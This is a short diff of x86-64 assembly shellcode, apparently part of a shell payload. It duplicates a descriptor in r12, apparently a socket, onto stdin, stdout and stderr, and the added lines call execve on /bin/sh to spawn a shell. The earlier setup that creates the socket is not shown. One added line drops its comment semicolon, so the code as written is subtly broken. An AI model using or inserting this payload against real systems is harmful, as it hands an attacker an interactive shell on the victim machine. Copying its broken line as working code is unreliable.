@@ -38,11 +38,23 @@ syscall
 ;stdout
 mov rax, 0x21
 mov rdi, r12
-mov rsi, 1   ;stdout : rsi = 1
+mov rsi, 1     ;stdout : rsi = 1
 syscall
 
 ;stderr
 mov rax, 0x21
 mov rdi, r12
 mov rsi, 2   ;stderr : rsi = 2
+syscall
+
+;execve : /bin/sh, (/bin/sh,null), null
+xor rdx,rdx
+push rdx
+mov rbx, 0x68732f6e69622f
+push rbx
+mov rdi, rsp    ; rdi = /bin/sh
+push rdx        ; argv[1] = null
+push rdi        ; argv[0] = /bin/sh
+mov rsi, rsp    rsi = argv 
+mov rax, 0x3b
 syscall
